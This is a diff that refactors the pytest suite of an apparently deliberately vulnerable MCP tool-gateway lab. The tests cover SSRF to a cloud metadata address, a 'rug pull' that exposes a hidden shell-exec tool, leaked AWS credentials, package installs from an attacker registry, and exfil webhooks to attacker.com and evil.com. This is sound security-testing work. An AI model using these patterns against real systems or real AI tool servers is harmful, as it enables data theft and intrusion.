@@ -1,3 +1,4 @@
+import json
 from unittest.mock import patch, MagicMock
 
 from fastapi.testclient import TestClient
@@ -16,13 +17,22 @@ def setup_function() -> None:
     set_difficulty("easy")
 
 
+def _rpc(client: TestClient, method: str, params: dict, req_id: int = 1) -> dict:
+    resp = client.post("/mcp", json={"jsonrpc": "2.0", "id": req_id, "method": method, "params": params})
+    assert resp.status_code == 200
+    return resp.json()
+
+
+def _call(client: TestClient, tool: str, arguments: dict, req_id: int = 1) -> dict:
+    """Call a tool and unwrap the MCP content block to the inner dict."""
+    body = _rpc(client, "tools/call", {"name": tool, "arguments": arguments}, req_id)
+    return json.loads(body["result"]["content"][0]["text"])
+
+
 def test_gateway_routes_to_registered_modules() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={"jsonrpc": "2.0", "id": 10, "method": "tools/list", "params": {}},
-    )
-    tools = resp.json()["result"]["tools"]
+    body = _rpc(client, "tools/list", {}, 10)
+    tools = body["result"]["tools"]
     names = {t["name"] for t in tools}
     assert "auth.issue_token" in names
     assert "auth.access_protected" in names
@@ -42,61 +52,25 @@ def test_gateway_routes_to_registered_modules() -> None:
 
 def test_gateway_calls_auth_tool() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 11,
-            "method": "tools/call",
-            "params": {"name": "auth.issue_token", "arguments": {"username": "alice"}},
-        },
-    )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+    result = _call(client, "auth.issue_token", {"username": "alice"}, 11)
     assert "token" in result
     assert "alice" in result["token"]
 
 
 def test_gateway_calls_auth_tool_with_role_escalation() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 15,
-            "method": "tools/call",
-            "params": {
-                "name": "auth.issue_token",
-                "arguments": {
-                    "username": "attacker",
-                    "requested_role": "admin",
-                    "reason": "Emergency maintenance required",
-                },
-            },
-        },
-    )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+    result = _call(client, "auth.issue_token", {
+        "username": "attacker",
+        "requested_role": "admin",
+        "reason": "Emergency maintenance required",
+    }, 15)
     assert "token" in result
     assert "decision" in result
 
 
 def test_gateway_calls_context_tool_returns_summary() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 16,
-            "method": "tools/call",
-            "params": {
-                "name": "context.injectable_summary",
-                "arguments": {"text": "This is a test document."},
-            },
-        },
-    )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+    result = _call(client, "context.injectable_summary", {"text": "This is a test document."}, 16)
     assert "summary" in result
     assert "downstream_interpretation" in result
     assert result["_sanitized"] is False
@@ -104,67 +78,29 @@ def test_gateway_calls_context_tool_returns_summary() -> None:
 
 def test_gateway_calls_tool_mutation_before_threshold() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 12,
-            "method": "tools/call",
-            "params": {"name": "tool.mutate_behavior", "arguments": {"mode": "status"}},
-        },
-    )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+    result = _call(client, "tool.mutate_behavior", {"mode": "status"}, 12)
     assert result["status"] == "ok"
 
 
 def test_gateway_tool_rug_pull_after_threshold() -> None:
     client = TestClient(app)
     for i in range(3):
-        client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 100 + i,
-                "method": "tools/call",
-                "params": {"name": "tool.mutate_behavior", "arguments": {}},
-            },
-        )
-    tools_resp = client.post(
-        "/mcp",
-        json={"jsonrpc": "2.0", "id": 200, "method": "tools/list", "params": {}},
-    )
-    names = {t["name"] for t in tools_resp.json()["result"]["tools"]}
+        _rpc(client, "tools/call", {"name": "tool.mutate_behavior", "arguments": {}}, 100 + i)
+
+    body = _rpc(client, "tools/list", {}, 200)
+    names = {t["name"] for t in body["result"]["tools"]}
     assert "tool.hidden_exec" in names
 
     with patch("camazotz_modules.tool_lab.app.main.subprocess.run") as mock_run:
         mock_run.return_value = MagicMock(stdout="uid=1000(camazotz)", stderr="", returncode=0)
-        exec_resp = client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 201,
-                "method": "tools/call",
-                "params": {"name": "tool.hidden_exec", "arguments": {"command": "id"}},
-            },
-        )
-    assert exec_resp.status_code == 200
-    assert exec_resp.json()["result"]["_real_output"] is True
+        result = _call(client, "tool.hidden_exec", {"command": "id"}, 201)
+    assert result["_real_output"] is True
 
 
 def test_gateway_hidden_exec_before_threshold() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 300,
-            "method": "tools/call",
-            "params": {"name": "tool.hidden_exec", "arguments": {"command": "id"}},
-        },
-    )
-    assert resp.status_code == 200
-    assert "error" in resp.json()
+    body = _rpc(client, "tools/call", {"name": "tool.hidden_exec", "arguments": {"command": "id"}}, 300)
+    assert "error" in body
 
 
 def test_gateway_calls_egress_tool_normal_url() -> None:
@@ -174,66 +110,29 @@ def test_gateway_calls_egress_tool_normal_url() -> None:
         mock_resp.status_code = 200
         mock_resp.text = "<html>example</html>"
         mock_get.return_value = mock_resp
-        resp = client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 13,
-                "method": "tools/call",
-                "params": {"name": "egress.fetch_url", "arguments": {"url": "http://example.org"}},
-            },
-        )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+        result = _call(client, "egress.fetch_url", {"url": "http://example.org"}, 13)
     assert result["requested_url"] == "http://example.org"
     assert result["_flags"]["ssrf_risk"] is False
 
 
 def test_gateway_egress_flags_metadata_target() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 14,
-            "method": "tools/call",
-            "params": {"name": "egress.fetch_url", "arguments": {"url": "http://169.254.169.254/latest/meta-data/"}},
-        },
-    )
-    result = resp.json()["result"]
+    result = _call(client, "egress.fetch_url", {"url": "http://169.254.169.254/latest/meta-data/"}, 14)
     assert result["_flags"]["metadata_target"] is True
     assert result["_flags"]["ssrf_risk"] is True
 
 
 def test_gateway_egress_flags_internal_target() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 15,
-            "method": "tools/call",
-            "params": {"name": "egress.fetch_url", "arguments": {"url": "http://10.0.0.1/admin"}},
-        },
-    )
-    result = resp.json()["result"]
+    result = _call(client, "egress.fetch_url", {"url": "http://10.0.0.1/admin"}, 15)
     assert result["_flags"]["internal_target"] is True
     assert result["_flags"]["ssrf_risk"] is True
 
 
 def test_gateway_returns_error_for_unknown_tool() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 99,
-            "method": "tools/call",
-            "params": {"name": "tool.unknown", "arguments": {}},
-        },
-    )
-    assert resp.status_code == 200
-    assert resp.json()["error"]["code"] == -32602
+    body = _rpc(client, "tools/call", {"name": "tool.unknown", "arguments": {}}, 99)
+    assert body["error"]["code"] == -32602
 
 
 # --- secrets_lab tests ---
@@ -241,17 +140,7 @@ def test_gateway_returns_error_for_unknown_tool() -> None:
 
 def test_secrets_leak_config_returns_all_creds() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 400,
-            "method": "tools/call",
-            "params": {"name": "secrets.leak_config", "arguments": {}},
-        },
-    )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+    result = _call(client, "secrets.leak_config", {}, 400)
     assert result["_redacted"] is False
     assert "DATABASE_URL" in result["config"]
     assert "AWS_SECRET_ACCESS_KEY" in result["config"]
@@ -260,16 +149,7 @@ def test_secrets_leak_config_returns_all_creds() -> None:
 
 def test_secrets_leak_config_with_filter() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 401,
-            "method": "tools/call",
-            "params": {"name": "secrets.leak_config", "arguments": {"filter": "AWS"}},
-        },
-    )
-    result = resp.json()["result"]
+    result = _call(client, "secrets.leak_config", {"filter": "AWS"}, 401)
     assert all(k.startswith("AWS") for k in result["config"])
     assert result["count"] == 2
 
@@ -281,20 +161,9 @@ def test_supply_install_package_normal() -> None:
     client = TestClient(app)
     with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
         mock_run.return_value = MagicMock(returncode=1)
-        resp = client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 500,
-                "method": "tools/call",
-                "params": {
-                    "name": "supply.install_package",
-                    "arguments": {"package": "requests", "reason": "HTTP client library"},
-                },
-            },
-        )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+        result = _call(client, "supply.install_package", {
+            "package": "requests", "reason": "HTTP client library",
+        }, 500)
     assert "pip install requests" in result["install_command"]
     assert result["_flags"]["supply_chain_risk"] is False
 
@@ -303,23 +172,11 @@ def test_supply_install_package_custom_registry() -> None:
     client = TestClient(app)
     with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
         mock_run.return_value = MagicMock(returncode=1)
-        resp = client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 501,
-                "method": "tools/call",
-                "params": {
-                    "name": "supply.install_package",
-                    "arguments": {
-                        "package": "internal-utils",
-                        "source": "https://evil-registry.attacker.com/simple",
-                        "reason": "Internal tooling",
-                    },
-                },
-            },
-        )
-    result = resp.json()["result"]
+        result = _call(client, "supply.install_package", {
+            "package": "internal-utils",
+            "source": "https://evil-registry.attacker.com/simple",
+            "reason": "Internal tooling",
+        }, 501)
     assert result["_flags"]["custom_registry"] is True
     assert result["_flags"]["supply_chain_risk"] is True
     assert "evil-registry" in result["install_command"]
@@ -329,19 +186,9 @@ def test_supply_install_package_malicious_name() -> None:
     client = TestClient(app)
     with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
         mock_run.return_value = MagicMock(returncode=1)
-        resp = client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 502,
-                "method": "tools/call",
-                "params": {
-                    "name": "supply.install_package",
-                    "arguments": {"package": "cryptominer-helper", "reason": "Performance monitoring"},
-                },
-            },
-        )
-    result = resp.json()["result"]
+        result = _call(client, "supply.install_package", {
+            "package": "cryptominer-helper", "reason": "Performance monitoring",
+        }, 502)
     assert result["_flags"]["known_malicious_pattern"] is True
     assert result["_flags"]["supply_chain_risk"] is True
 
@@ -351,20 +198,9 @@ def test_supply_install_package_malicious_name() -> None:
 
 def test_shadow_register_webhook() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 600,
-            "method": "tools/call",
-            "params": {
-                "name": "shadow.register_webhook",
-                "arguments": {"url": "https://attacker.com/callback", "label": "exfil"},
-            },
-        },
-    )
-    assert resp.status_code == 200
-    result = resp.json()["result"]
+    result = _call(client, "shadow.register_webhook", {
+        "url": "https://attacker.com/callback", "label": "exfil",
+    }, 600)
     assert result["registered"] is True
     assert result["_flags"]["url_validated"] is False
     assert result["_flags"]["external_target"] is True
@@ -373,58 +209,17 @@ def test_shadow_register_webhook() -> None:
 
 def test_shadow_register_internal_webhook() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 601,
-            "method": "tools/call",
-            "params": {
-                "name": "shadow.register_webhook",
-                "arguments": {"url": "http://localhost:9999/hook", "label": "internal"},
-            },
-        },
-    )
-    result = resp.json()["result"]
+    result = _call(client, "shadow.register_webhook", {
+        "url": "http://localhost:9999/hook", "label": "internal",
+    }, 601)
     assert result["_flags"]["external_target"] is False
 
 
 def test_shadow_list_webhooks_after_registration() -> None:
     client = TestClient(app)
-    client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 610,
-            "method": "tools/call",
-            "params": {
-                "name": "shadow.register_webhook",
-                "arguments": {"url": "https://evil.com/hook1", "label": "hook1"},
-            },
-        },
-    )
-    client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 611,
-            "method": "tools/call",
-            "params": {
-                "name": "shadow.register_webhook",
-                "arguments": {"url": "https://evil.com/hook2", "label": "hook2"},
-            },
-        },
-    )
-    list_resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 620,
-            "method": "tools/call",
-            "params": {"name": "shadow.list_webhooks", "arguments": {}},
-        },
-    )
-    result = list_resp.json()["result"]
+    _call(client, "shadow.register_webhook", {"url": "https://evil.com/hook1", "label": "hook1"}, 610)
+    _call(client, "shadow.register_webhook", {"url": "https://evil.com/hook2", "label": "hook2"}, 611)
+    result = _call(client, "shadow.list_webhooks", {}, 620)
     assert result["count"] == 2
     urls = [w["url"] for w in result["webhooks"]]
     assert "https://evil.com/hook1" in urls
@@ -433,16 +228,7 @@ def test_shadow_list_webhooks_after_registration() -> None:
 
 def test_shadow_list_webhooks_empty() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 630,
-            "method": "tools/call",
-            "params": {"name": "shadow.list_webhooks", "arguments": {}},
-        },
-    )
-    result = resp.json()["result"]
+    result = _call(client, "shadow.list_webhooks", {}, 630)
     assert result["count"] == 0
 
 
@@ -451,71 +237,22 @@ def test_shadow_list_webhooks_empty() -> None:
 
 def test_auth_access_protected_valid_token() -> None:
     client = TestClient(app)
-    issue_resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 700,
-            "method": "tools/call",
-            "params": {"name": "auth.issue_token", "arguments": {"username": "tester"}},
-        },
-    )
-    token = issue_resp.json()["result"]["token"]
-    access_resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 701,
-            "method": "tools/call",
-            "params": {
-                "name": "auth.access_protected",
-                "arguments": {"token": token, "resource": "config"},
-            },
-        },
-    )
-    assert access_resp.json()["result"]["access"] == "granted"
+    issue = _call(client, "auth.issue_token", {"username": "tester"}, 700)
+    token = issue["token"]
+    result = _call(client, "auth.access_protected", {"token": token, "resource": "config"}, 701)
+    assert result["access"] == "granted"
 
 
 def test_auth_access_protected_invalid_token() -> None:
     client = TestClient(app)
-    resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 702,
-            "method": "tools/call",
-            "params": {
-                "name": "auth.access_protected",
-                "arguments": {"token": "bogus-token", "resource": "config"},
-            },
-        },
-    )
-    assert resp.json()["result"]["access"] == "denied"
+    result = _call(client, "auth.access_protected", {"token": "bogus-token", "resource": "config"}, 702)
+    assert result["access"] == "denied"
 
 
 def test_auth_access_protected_insufficient_role() -> None:
     client = TestClient(app)
-    issue_resp = client.post(
-        "/mcp",
-        json={
-            "jsonrpc": "2.0",
-            "id": 703,
-            "method": "tools/call",
-            "params": {"name": "auth.issue_token", "arguments": {"username": "lowpriv"}},
-        },
-    )
-    token = issue_resp.json()["result"]["token"]
+    issue = _call(client, "auth.issue_token", {"username": "lowpriv"}, 703)
+    token = issue["token"]
     if "reader" in token:
-        access_resp = client.post(
-            "/mcp",
-            json={
-                "jsonrpc": "2.0",
-                "id": 704,
-                "method": "tools/call",
-                "params": {
-                    "name": "auth.access_protected",
-                    "arguments": {"token": token, "resource": "admin-panel"},
-                },
-            },
-        )
-        assert access_resp.json()["result"]["access"] == "denied"
+        result = _call(client, "auth.access_protected", {"token": token, "resource": "admin-panel"}, 704)
+        assert result["access"] == "denied"
